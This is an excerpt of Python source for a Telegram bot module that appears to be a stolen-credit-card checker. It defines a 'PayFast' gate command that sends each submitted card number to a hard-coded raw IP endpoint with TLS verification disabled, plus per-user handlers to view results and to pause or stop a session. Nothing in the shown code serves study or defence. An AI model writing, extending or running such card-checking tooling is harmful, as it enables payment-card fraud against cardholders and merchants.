...
GATE_NAME = "PayFast"
GATE_CMD = "mpf"
PF_API = "http://5.83.136.66:8006/payfast?cc={cc}"
active_sessions = {}
...
def process_single_card(card):
    try:
        resp = requests.get(PF_API.format(cc=card), timeout=90, verify=False)
        if resp.status_code == 200:
            data = resp.json()
...
@router.message(Command("mpf"))
async def mpf_command(message: types.Message):
...
@router.callback_query(F.data.startswith("mpf_card_"))
async def mpf_card_callback(callback: types.CallbackQuery):
...
@router.callback_query(F.data.startswith("mpf_response_"))
async def mpf_response_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
...
@router.callback_query(F.data.startswith("mpf_stop_"))
async def mpf_stop_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
...
@router.callback_query(F.data.startswith("mpf_pause_"))
async def mpf_pause_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
